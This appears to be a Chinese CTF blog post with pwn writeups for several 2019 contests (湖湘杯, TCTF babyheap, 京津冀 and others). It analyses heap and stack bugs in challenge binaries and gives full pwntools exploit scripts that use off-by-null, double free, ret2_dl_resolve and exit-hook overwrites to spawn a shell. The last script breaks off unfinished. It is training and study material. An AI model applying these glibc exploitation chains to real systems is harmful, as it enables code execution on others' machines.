---
title: 湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup
categories:
- CTF writeup
---

# 湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup

## 前言

现在越来越懒得更博客了，趁着还没到考试周把前段时间做的题记录一下，分别是湖湘杯AWD，京津冀线下，安洵杯的一道heap和SWPUCTF。

## 湖湘杯

### pwn1 

#### 程序分析

libc为2.23，保护全开，一共有四个功能，Store，Delete，Post和Exit，输入错误选项会调用` _fprintf_chk(stderr, 1LL, "unknown options, foolish %s", byte_202100);`

Store是在bss上新建一个node，每个node包括chunk_addr，in_use，size等内容，固定分配0x68大小的chunk，chunk_size为输入的长度。

```c
00000000 node            struc ; (sizeof=0x10, mappedto_8)
00000000 is_in_use       dd ?
00000004 chunk_size      dd ?
00000008 chunk_addr      dq ?
00000010 node            ends
```

```c
int Store()
{
  node **v0; // rax
  unsigned int idx; // ebx
  _BYTE *chunk_addr; // rax
  node *v3; // rbx

  if ( LODWORD(dword_202080[0]) )
  {
    v0 = dword_202080;
    idx = 1;
    while ( *((_DWORD *)v0 + 4) )
    {
      ++idx;
      v0 += 2;
      if ( idx == 8 )
      {
        fwrite("Too many TODOs :P\n", 1uLL, 0x12uLL, stderr);
        fflush(stderr);
        exit(0);
      }
    }
  }
  else
  {
    idx = 0;
  }
  _printf_chk(1LL, "contents: ");
  chunk_addr = malloc(0x68uLL);
  v3 = (node *)&dword_202080[2 * idx];
  v3->chunk_addr = (__int64)chunk_addr;
  v3->is_in_use = 1;
  v3->chunk_size = get_input(chunk_addr, 0x68);
  _printf_chk(1LL, "check: %llx\n");
  return puts("Done!");
}
```

Delete会清空node，释放chunk。

```c
int Delet()
{
  unsigned int idx; // eax
  node *v1; // rbx

  _printf_chk(1LL, "which: ");
  idx = read_choice();
  if ( idx > 7 || !LODWORD(dword_202080[2 * (signed int)idx]) )
  {
    fwrite("Invalid ID :P\n", 1uLL, 0xEuLL, stderr);
    fflush(stderr);
    exit(0);
  }
  v1 = (node *)&dword_202080[2 * (signed int)idx];
  v1->is_in_use = 0;
  v1->chunk_size = 0;
  free((void *)v1->chunk_addr);
  v1->chunk_addr = 0LL;
  return puts("Done!");
}
```

Post首先让用户选择一个idx的node，之后选择Alice/Bob/Jenny/Danny(实际四个选项最后对应的函数功能一致)，根据给的这里的idx2，选择调用对应index的函数指针。函数指针数组的内容如下，这里没有限制idx_2的最小值，因此可以下溢，访问到0x202020之前的数据作为函数指针

```c
int __fastcall Post(__int64 IO_FILE)
{
  unsigned int idx; // eax
  unsigned int idx1; // ebx
  signed int idx_2; // eax

  _printf_chk(1LL, "which: ");
  idx = read_choice();
  if ( idx > 7 || (idx1 = idx, !LODWORD(dword_202080[2 * (signed int)idx])) )
  {
    fwrite("Invalid ID :P\n", 1uLL, 0xEuLL, stderr);
    fflush(stderr);
    exit(0);
  }
  menu1();
  _printf_chk(1LL, "who: ");
  idx_2 = read_choice();
  if ( idx_2 > 3 )                              // 下溢出？
  {
    fwrite("Invalid person :P\n", 1uLL, 0x12uLL, stderr);
    fflush(stderr);
    exit(0);
  }
  ((void (__fastcall *)(__int64, __int64, unsigned int))funcs_1375[idx_2])(
    IO_FILE,
    (__int64)dword_202080[2 * (signed int)idx1 + 1],
    HIDWORD(dword_202080[2 * (signed int)idx1]));
  return puts("Done!");
}
/*
.data:0000000000202010 00 00 00 00 00 00 00 00+                align 20h
.data:0000000000202020 4E 0C 00 00 00 00 00 00+funcs_1375      dq offset Alice0        ; DATA XREF: Post+F5↑o
.data:0000000000202020 F7 0C 00 00 00 00 00 00+                                        ; Post+FC↑r
.data:0000000000202020 A0 0D 00 00 00 00 00 00+                dq offset Bob1
.data:0000000000202020 49 0E 00 00 00 00 00 00                 dq offset Jenny2
.data:0000000000202020                                         dq offset Danny3
.data:0000000000202020                         _data           ends
*/
```

#### 漏洞利用

到这里我们调试可以发现Got表在函数指针数组的上方，因此可以访问任意got表函数，我们再看下调用函数的参数及后面发生的事情。固定调用三个参数为IO_FILE，chunk_addr以及chunk_size。

```c
((void (__fastcall *)(__int64, __int64, unsigned int))funcs_1375[idx_2])(
    IO_FILE,
    (__int64)dword_202080[2 * (signed int)idx1 + 1],
    HIDWORD(dword_202080[2 * (signed int)idx1]));
```
第一个参数是IO_FILE的其实很有限，我当时想的是想办法将IO_FILE的缓冲区关联到一块可控区域，不过尝试了几个函数都不行，最后去看别的pwn了，赛后陆晨学长说是setbuf的洞，搜了一下才发现确实之前有出过类似的题目，linux man一下sebuf，大概

```
DESCRIPTION
       The  three  types of buffering available are unbuffered, block buffered, and
       line buffered.  When an output stream is unbuffered, information appears  on
       the  destination  file  or  terminal  as  soon  as written; when it is block
       buffered many characters are saved up and written as a  block;  when  it  is
       line  buffered characters are saved up until a newline is output or input is
       read from any stream attached to a terminal device (typically  stdin).   The
       function  fflush(3)  may  be  used  to  force  the  block  out  early.  (See
       fclose(3).)

       Normally all files are block buffered.  If a stream refers to a terminal (as
       stdout  normally  does),  it  is  line  buffered.  The standard error stream
       stderr is always unbuffered by default.

       The setvbuf() function may be used on any open stream to change its  buffer.
       The mode argument must be one of the following three macros:

              _IONBF unbuffered

              _IOLBF line buffered

              _IOFBF fully buffered

       Except  for  unbuffered  files, the buf argument should point to a buffer at
       least size bytes long; this buffer will be used instead of the current  buf‐
       fer.   If  the argument buf is NULL, only the mode is affected; a new buffer
       will be allocated on the next read or write operation.  The setvbuf()  func‐
       tion may be used only after opening a stream and before any other operations
       have been performed on it.

       The other three calls are, in effect, simply aliases for calls to setvbuf().
       The setbuf() function is exactly equivalent to the call
       setvbuf(stream, buf, buf ? _IOFBF : _IONBF, BUFSIZ);
```

大概意思就是说缓冲区有三种模式，无缓冲/行缓冲/满缓冲，sebuf等于下面的形式，我们可以做个实验，给个char*的buf，sebuf(stdout,buf);使用printf输出的时候并没输出到终端上，而是进入了buf数组。

到这里这里的利用其实已经有头绪了，我们将stderr(固定参数1，可以通过看汇编找前面rdi的来源确定)同chunk_addr关联起来，再输入一个invalid choice触发`_fprintf_chk((__int64)stderr, 1LL, (__int64)"unknown options, foolish %s", (__int64)byte_202100);`当我们输入的name长度为0x50时，实际输入到heap的长度为25+0x50=0x69，从而在heap中可以off-by-one。

这里注意fflush两次才能让数据全部进入到heap，这也是学长试验出来的，后面构造ub的overlap，Delete之后用另一个调用Alice或其他函数泄露libc，最后get shell

```c
unsigned __int64 __fastcall Alice0(__int64 IO_FILE, __int64 chunk_addr, unsigned int chunk_size)
{
  __int64 v4; // [rsp+0h] [rbp-118h]
  unsigned __int64 v5; // [rsp+108h] [rbp-10h]

  v5 = __readfsqword(0x28u);
  memset(&v4, 0, 0x100uLL);
  if ( (unsigned int)_sprintf_chk(
                       (__int64)&v4,
                       1LL,
                       0x100LL,
                       (__int64)"Send %d bytes: %s to Alice\n",
                       chunk_size,
                       chunk_addr)
     - 1 > 0xFE )
  {
    fwrite("Msg Size error!\n", 1uLL, 0x10uLL, stderr);
    fflush(stderr);
    exit(0);
  }
  puts((const char *)&v4);
  return __readfsqword(0x28u) ^ v5;
}
```

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn1')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn1')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Store(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("contents: ")
    p.send(content)

def Delete(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('which: ')
    p.sendline(str(index))

def Post(index0,index1):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('which: ')
    p.sendline(str(index0))
    p.recvuntil('who: ')
    p.sendline(str(index1))

def MakeU():
    p.recvuntil('> ')
    p.sendline('17')

def exp():
    p.recvuntil("Frist input your name>")
    p.sendline('a'*0x4f+'\xe1')
    #leak libc
    Store('0\n')
    Store('1\n')
    Store('2\n')
    Store('3\n')
    Store('4\n')
    Store('5\n')

    Post(0,-21)
    MakeU()
    MakeU()

    Delete(1)
    Store('1\n')#1
    Store('6\n')#6 == 2
    #
    Post(2,-21)
    MakeU()
    MakeU()
    Delete(3)
    Store('3\n')#3
    Store('7\n')#7 == 4
    #
    Post(1,-21)
    MakeU()
    MakeU()
    Delete(2)
    Post(6,0)

    p.recvuntil("Send 1 bytes: ")
    libc_base = u64(p.recvuntil('\x7f',drop=False).ljust(8,'\x00')) - 88 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc base => " + hex(libc_base))
    #get shell
    Delete(4)
    Delete(0)
    Delete(7)

    #
    shell_addr = libc_base + gadgets[2]
    libc.address = libc_base
    Store(p64(libc.sym['__malloc_hook']-0x23)+'\n')
    Store('a'*0x13+p64(shell_addr)+'\n')

    Store('a'*0x13+p64(shell_addr)+'\n')

    #gdb.attach(p,'b* 0x555555554000+0x136e')
    Store('a'*0x13+p64(shell_addr)+'\n')
    Delete(0)

    p.recvuntil('> ')
    p.sendline('1')

    p.interactive()

exp()
```

### pwn2

#### 程序逻辑

一道典型的菜单题，漏洞在于Edit的off-by-null，libc是2.29，断网环境+不熟悉导致开局就先放弃了这个，后面研究了一下2.29的新保护机制发现这个根本用不上那些。

程序有add、delete、edit、show。直接用Off-by-one释放一个大的块作为Ub，泄露地址之后往一个0x240的块fd写free_hook即可。

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn2')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn2')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Add(idx,size,content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("cnt:")
    p.send(content)

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('idx:')
    p.sendline(str(idx))

def Edit(idx,content):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil("cnt:")
    p.send(content)

def Show(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('idx:')
    p.sendline(str(idx))

def Hint(content):
    p.recvuntil('> ')
    p.sendline('5')
    p.recvuntil("Because I know you are 666!\n")
    p.send(content)


def exp():
    #leak libc
    Add(0,0x238,'0'*0x238)
    Add(1,0x238,'1\n')
    Add(2,0x233,p64(0x21)*17+'\n')#0x240
    Add(3,0x233,p64(0x21)*17+'\n')#0x240
    Add(4,0x233,p64(0x21)*17+'\n')#0x240
    Add(5,0x233,p64(0x21)*17+'\n')#0x240
    Add(6,0x233,p64(0x21)*17+'\n')#0x240
    Add(7,0x233,p64(0x21)*17+'\n')#0x240
    Add(8,0x233,p64(0x21)*17+'\n')#0x240


    Edit(0,'/bin/sh\x00'+'0'*0x230+'\x01\x09')

    Delete(1)#1+2+3+4
    Add(1,0x230,'1\n')#1

    Show(2)


    libc_base = u64(p.recv(8)) - 0x60 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc base => " + hex(libc_base))
    #gdb.attach(p,'b* 0x0000555555554000+0x14e5')
    libc.address = libc_base
    free_hook = libc.sym['__free_hook']
    #get shell
    Delete(3)

    Add(3,0x6b0,'a'*0x230+p64(0)+p64(0x241)+p64(free_hook)+'\n')

    Hint('a'*8)
    Hint(p64(libc.sym['system']))
    Delete(0)
    #gdb.attach(p)
    p.interactive()

exp()
```

### pwn3

#### 漏洞利用

pwn3其实也是一道2.29的题，没给libc所以开始先做的这个，后面发现是2.29又换题看了。

功能包括Add Delete Edit，还有一次leak的机会，Add固定长度为0x48，leak的对象是chunk_list[0]。Edit里是循环判断idx，idx可以为负数前溢出，Delete里有double free。

利用思路是UAF分配到chunk0的size部分，改成0x420(large bin)，在其后布置另一个fake chunk，释放chunk0即可泄露地址，再UAF即可get shell。

#### exp.py
```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn3')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn3')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Add(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("input> ")
    p.send(content)

def Show():
    p.recvuntil('> ')
    p.sendline('5')

def Delete(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('id> ')
    p.sendline(str(index))

def Edit(index,content):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('id> ')
    p.sendline(str(index))
    p.recvuntil("input> ")
    p.send(content)

def exp():
    #leak heap
    #payload = p64(0xfbad1800)+p64(0)*3+"\x00"
    #gdb.attach(p,'b* 0x0000555555554000+0x1536')
    #Edit(-8,payload)
    Add('0'*8)#0
    Add('1'*8)#1
    Delete(0)
    Delete(1)
    Edit(1,'\x50')
    Add('2'*8)#2
    Add(p64(0)+p64(0x421))#3
    Add('4'*8)#4

    Delete(1)
    Delete(4)
    Edit(4,'\x70\x96')
    Add('5'*8)#5
    Add(p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0x21))#6

    Delete(0)
    Show()
    p.recvuntil("Maybe a release of ubuntu!\n")
    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 0x60
    log.success("libc base => " + hex(libc_base))
    free_hook = libc_base + libc.sym['__free_hook']

    Delete(1)

    Delete(4)

    Edit(4,p64(free_hook)[:-2])

    Add("/bin/sh\x00")#7
    Add(p64(libc_base+libc.sym['system']))#8
    #gdb.attach(p)
    Delete(7)
    p.interactive()

exp()
```

## TCTF2019

### babyheap

#### 前言

补充一道前两天做2.29的题目，理解跟2.23和2.27的不同

#### 程序逻辑

依然是菜单题，功能有Add、Update、Delete、View

Add的size范围为0到0x1000，Update存在off-by-null，程序保护全开

#### 漏洞利用

正常有off-by-null我们要构造overlapping chunk，一般来说构造的堆分布如下：

chunk0->0x88  
chunk1->0x68  
chunk2->0xf8  
chunk3(in case to consolidate)

释放chunk1再分配得到chunk1，off-by-null改掉chunk2的prev_size，free(chunk0)和free(chunk2)即可得到一个chunk0~2的大的块，进而overlapped chunk1，这种方式在这里就不太行了，这是因为2.29在unlink前添加了新的检查。  
对于我们的chunk2，释放的时候会先检查其prev_inuse位，这里被我们改成了0，因此继续判断，根据prev_size寻找到了unlink的目标chunk0(p)，之后的判断chunksize(p) == 0x90，而prev_size == 0x90+0x70，二者不相等，触发error，从而unlink失败。  


```c
//glibc-2.29 ./malloc/malloc.c _int_free()
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize)) //patch
        malloc_printerr ("corrupted size vs. prev_size while consolidating"); //patch
      unlink_chunk (av, p);
    }
```

同样在malloc_consolidate中也有相同的检查

```c
//glibc-2.29 ./malloc/malloc.c static void malloc_consolidate(mstate av)
	if (!prev_inuse(p)) {
	  prevsize = prev_size (p);
	  size += prevsize;
	  p = chunk_at_offset(p, -((long) prevsize));
	  if (__glibc_unlikely (chunksize(p) != prevsize))  //patch
	    malloc_printerr ("corrupted size vs. prev_size in fastbins"); //patch
	  unlink_chunk (av, p);
	}
```

为了绕过prev_size==chunk_size的检查，我们要自己构造fake_chunk，同时满足这个check以及unlink的检查，这样的构造在有heap地址的时候比较容易，对于手里没地址的情况比较复杂，这个在Balsn CTF2019有题，Ex师傅也写了篇博客分析glibc2.29下的通用off-by-null的通用利用思路，之后会填坑。

首先分配并释放一个unsorted bin，再分配之后利用残留的libc可以得到libc地址。  
释放两个chunk 1 和 2，2的fd为chunk1的地址(tcache_list)，分配得到2，show(2)即可泄露heap1地址，进而得到堆地址。  

再往后我们还是构造之前的堆分配布局，但不一样的是我们在chunk0中构造fake_chunk，合并的从012变成fake_chunk+1+2。
构造的fake_chunk需要满足以下条件:  
1. size: == offset between fake_chunk && chunk2
2. fd: some_addr_that_store_fake-chunk-addr - 0x18
3. bk: fd - 0x8  
因为我们手里有了heap地址，所以满足上面的条件很容易，最后overlap之后即可通过update修改fd到free_hook从而get shell

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./babyheap2.29')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./babyheap2.29')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Alloc(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil("Size: ")
    p.sendline(str(size))

def Update(index,size,content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)

def Delete(index):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Show(index):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def exp():
    #leak libc
    Alloc(0x420)#0
    for i in range(8):
        Alloc(0xf8)#1~8
    Alloc(0xf8)#9
    Alloc(0xf8)#10
    Alloc(0xf8)#11
    Alloc(0x28)#12
    Delete(0)

    Alloc(0x420)#0

    Show(0)

    p.recvuntil("Chunk[0]: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x60 - libc.sym['__malloc_hook'] - 0x10
    log.success("libc base => " + hex(libc_base))
    #leak heap
    Delete(1)
    Delete(2)

    Alloc(0xf8)#1
    Show(1)
    p.recvuntil("Chunk[1]: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x690
    log.success("heap base => " + hex(heap_base))
    #fill the tcache
    Delete(1)
    for i in range(3,9):
        Delete(i)

    payload = p64(heap_base+0xe90)*2+'a'*0xe0+p64(0x1f0)
    Update(10,len(payload),payload)
    #
    fd = heap_base+0xf80
    bk = fd

    Update(9,0x20,p64(0)+p64(0x1f1)+p64(fd)+p64(bk))

    Delete(11)#9+10+11 overlapping with 9 10 11
    #double free
    for i in range(8):
        Alloc(0x68)#1 2 [3,8]

    Delete(1)
    Delete(2)

    for i in range(3,4):
        Delete(i)
    for i in range(5,9):
        Delete(i)
    Delete(4)
    libc.address = libc_base
    for i in range(7):
        Alloc(0x68)#1 2 [3,8]

    payload = 'a'*0x70+p64(0)+p64(0x71)+p64(libc.sym['__free_hook']-0x10)
    Update(9,len(payload),payload)
    Alloc(0x68)#8
    Alloc(0x68)#11
    Update(11,0x8,p64(libc.sym['system']))
    Update(8,8,'/bin/sh\x00')
    Delete(8)
    #gdb.attach(p)
    p.interactive()

exp()
```

## 京津冀

### 前言

让我很难受的一场，ret2_dl_resolve手里没有脚本加上很久没做，中间卡住了就不断换题，最后一道没出，菜的有点过分了。

### pwn1

#### 程序逻辑&漏洞利用

第一眼看没什么，看汇编可以发现其实还是溢出了,有点像DDCTF的题，ebp-4的值作为addr，跳转到addr-4的值继续执行。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+4h] [ebp-14h]

  read(0, &gift, 0x14u);
  read(0, &buf, 0x14u);
  return 0;
}
```

```asm
.text:08048448                 mov     ecx, [ebp+var_4]
.text:0804844B                 leave
.text:0804844C                 lea     esp, [ecx-4]
.text:0804844F                 retn
```

开始的时候我们有0x14字节的输入，可以布置一次read，但是不足以栈迁移到bss。就是在这里卡住了，开始一直找Gadgets跳过去，换题再回来之后发现不需要这样，直接read的地址改成0x14字节后面的地址，这样可以接力部署gadgets和值，也就是说输入为gadgets+padding+data，gadgets负责栈迁移，后面就是ret2_dl_resolve，这种复杂的东西还是要学会用roputils或者自己写模板脚本。

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='debug')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./stack')

if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./stack')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    libc = ELF('./x86_libc.so.6')
    p = remote('f.buuoj.cn',20171)

csu_start = 0x080484a8
csu_end = 0x08048488
def csu(ebx,esi,edi,ebp,retn_addr):
    payload = p32(csu_start)+p32(ebx)+p32(esi)+p32(edi)+p32(ebp)
    return payload

def exp():
    #ebx=call_func
    #esi=1
    #edi=0
    #ebp=arg1
    leave_ret = 0x08048378
    read_got = elf.got['read']
    read_plt = elf.plt['read']
    libc_start_got = elf.got['__libc_start_main']
    bss_base = elf.bss()+0x300

    ret_addr = 0x080482b2
    leave_ret = 0x08048378
    p_ebp = 0x080484ab
    p2_ret = 0x080484aa
    gift = p32(read_plt)+p32(p2_ret)+p32(0)+p32(0x0804a024)+p32(0x500)
    p.send(gift)
    #
    gdb.attach(p,'b* 0x0804844f')
    p.send("a"*0x10+p32(0x0804a024))
    print hex(bss_base)
    #
    dyn_str = 0x804821C
    print hex(dyn_str)
    dyn_sym = 0x80481CC
    print hex(dyn_sym)
    rel_plt = 0x8048298
    print hex(rel_plt)
    #
    fake_rel_off = (bss_base+20+4) - rel_plt
    #rel 0x8 4 bytes padding
    fake_got = libc_start_got
    fake_sym_off = (((bss_base+20+4+8 - dyn_sym)/ 0x10) << 8) + 7
    fake_rel = p32(fake_got)+p32(fake_sym_off)
    #sym 0x10
    st_name = (bss_base+20+4+8+0x10 - dyn_str)
    fake_sym = p32(st_name)+p32(0)+p32(0)+chr(0x12)+chr(0)+p16(0)
    #
    strngs = "system\x00\x00"
    strngs += "/bin/sh\x00"
    binsh_addr = (bss_base+20+4+8+0x10+8)
    resolve_plt = elf.get_section_by_name('.plt').header.sh_addr
    #rop len == 20
    payload = p32(0x080482b2)
    payload += p32(resolve_plt)+p32(fake_rel_off)+'a'*4+p32(binsh_addr)
    buf = payload
    buf += 'a'*4#pad
    buf += fake_rel
    buf += fake_sym
    buf += strngs

    raw_input()
    p.send(p32(p_ebp)+p32(bss_base)+p32(leave_ret)+'a'*0x2ec+buf)
    #p.send(buf)
    p.interactive()

exp()
```

### pwn2

#### 程序逻辑 & 漏洞利用

pwn2 其实是最近很流行的exit利用的一种，xctf的时候我成功利用过一次，当时比赛的时候由于ld.so没给，libc和ld的偏移也没确定，远程失败，这次大概猜到最后的利用链，但是还是没想明白怎么泄露地址。

题目为libc 2.27，一共有7次写的机会。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+3h] [rbp-2Dh]
  unsigned int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  _BYTE *chunk_addr; // [rsp+10h] [rbp-20h]
  __int64 idx; // [rsp+18h] [rbp-18h]
  char num_buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  __isoc99_scanf(&unk_B54, &size);
  chunk_addr = malloc(size);
  if ( !chunk_addr )
    exit(7777);
  for ( i = 0; (signed int)i <= 6; ++i )
  {
    printf("%d\n", i);
    memset(&num_buf, 0, 8uLL);
    read(0, &num_buf, 8uLL);
    read(0, &buf, 1uLL);
    idx = get_num((__int64)&num_buf);
    chunk_addr[idx] = buf;
  }
  exit(7777);
}
```

泄露方法是分配一块极大size的heap，这种利用在之前的Hitcon出现过，最后map的地址用来存放堆，给定一个size，map和libc的偏移是一定的。我们可以分配一块极大的heap，通过两次写改掉_IO_2_1_stdut_的_flags和_IO_write_base泄露libc。

后面需要了解exit的调用过程，在HCTF-the end中可以看到最后调用_dl_fini，一直跟下去，会发现有几次调用`_rtld_global+3848`，前面lea rdi设置的参数在`_rtld_global+2312`

![call](./jjj_pwn2_1.png)

因此用3次写函数指针的后三位为syetem函数后三位(本身就是一个libc相关的地址)，再两字节改参数为'sh'，最后即可调用system("sh")，这里的_rtld_global是ld中的符号，我是直接调试的，题目给了ld，也可以用ld.sym再计算偏移(和heap以及libc的偏移也是固定的)

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./heap')
libc_offset = 0x3c4b20
gadgets = [0x4f2c5,0x4f322,0x10a38c]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./heap')

else:
    libc = ELF('./libc-2.27.so')
    p = remote('f.buuoj.cn',20173)

def Add(size,name,call):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil("Please input the size of compary's name")
    p.sendline(str(size))
    p.recvuntil("please input name:")
    p.send(name)
    p.recvuntil("please input compary call:")
    p.send(call)

def Show(index):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil("Please input the index:")
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil("Please input the index:")
    p.sendline(str(index))

def RandWrite(libc_off,val):
    idx = libc_off + 0x1000ff0
    p.recvline()
    p.send(str(idx))
    p.send(val)

def exp():
    #leak libc
    #size

    offset = 0x13ed750
    p.sendline(str(0xfffff0))
    #
    p.recvuntil("0\n")
    p.send(str(offset+1))
    p.send('\x38')

    p.recvuntil("1\n")

    p.send(str(offset+0x20))

    p.send('\x00')
    p.recvn(8)
    libc_base = u64(p.recv(8)) - (0x7fd2b2a208b0-0x7fd2b2633000)
    log.success("libc base => " + hex(libc_base))
    shell_addr = libc_base + gadgets[0]
    '''
    p.recvuntil("2\n")
    p.send(str(offset+0x28))
    p.send('\xff')

    #

    RandWrite(0x3e82b8,p64(shell_addr)[-1])
    RandWrite(0x3e82b9,p64(shell_addr)[-2])
    gdb.attach(p)
    RandWrite(0x3e82ba,p64(shell_addr)[-3])
    '''

    print hex(shell_addr)
    system_addr = libc_base + libc.sym['system']
    RandWrite(0x619f68,p64(system_addr)[0])
    RandWrite(0x619f69,p64(system_addr)[1])
    RandWrite(0x619f6a,p64(system_addr)[2])
    RandWrite(0x619f68-(3848-2312),'s')
    gdb.attach(p,'b _dl_fini+320')
    RandWrite(0x619f68-(3848-2312)+1,'h')

    p.interactive()

exp()
```

### pwn3

#### 程序逻辑&漏洞利用

pwn3的环境是2.29，有Malloc和Edit，看到没有free就想到了House-of-Orange，Edit可以指定读取的size，存在堆溢出。

这里不太方便的是全局只有一个buf用来存储chunk，后面新的会覆盖原来的。我们用Edit溢出到top_chunk修改其size，最后释放一个较大的块得到一个tcache，再往后我们没办法通过Edit编辑tcache，因为我们分配的这个较大块已经是另一块map的heap，无法前溢。因此我们要想办法通过不释放一个大于top_chunk_size的情况下让top_chunk掉下来。

这里用scanf的时候输入大量数据，scanf内部会malloc一块区域存储数据，导致top_chunk进入了tcache，进而我们可以Edit编辑tcache。

改fd到bss的stdout的位置，再两次分配到stdout泄露地址。

同样的方式改malloc_hook到one_gadget

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./heap9')
libc_offset = 0x3c4b20
gadgets = [0x4f2c5,0x4f322,0x10a38c]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./heap9')

else:
    libc = ELF('./libc-2.27.so')
    p = remote('f.buuoj.cn',20173)

def Add(size,content):
    p.recvuntil('> ')
    p.sendline('M')
    p.recvuntil("size > ")
    p.sendline(str(size))
    p.recvuntil("content > ")
    p.send(content)

def Edit(size,content):
    p.recvuntil('> ')
    p.sendline('E')
    p.recvuntil("size > ")
    p.sendline(str(size))
    p.recvuntil("content > ")
    p.send(content)

def exp():
    #hajack struct
    stdout_addr = 0x601020
    for i in range(11):
        Add(0x108,'a')
    Add(0xa8,'0')
    Add(0x10,'a')
    Edit(0x20,'a'*0x10+p64(0)+p64(0x131))
    p.recvuntil('> ')
    p.sendline('M')
    p.recvuntil("size > ")
    p.sendline("1"*0xe00)
    Edit(0x28,'a'*0x10+p64(0)+p64(0x111)+p64(stdout_addr))
    Add(0x108,'a')

    Add(0x108,'\x60')
    Add(0x108,p64(0xfbad1800)+p64(0)*3+'\x00')
    p.recvn(0x20)
    libc_base = u64(p.recv(8)) - (0x7fa7e621d780-0x7fa7e6039000)
    log.success("libc base => " + hex(libc_base))
    #
    for i in range(27):
        Add(0x80,'0')
    Add(0x40,'0')

    Edit(0x50,'0'*0x40+p64(0)+p64(0x81))

    p.recvuntil('> ')
    p.sendline('M')
    p.recvuntil("size > ")
    p.sendline("1"*0x1000)
    libc.address = libc_base
    gadgets = [0xe237f,0xe2383,0xe2386,0x106ef8,]
    shell_addr = libc_base + gadgets[1]
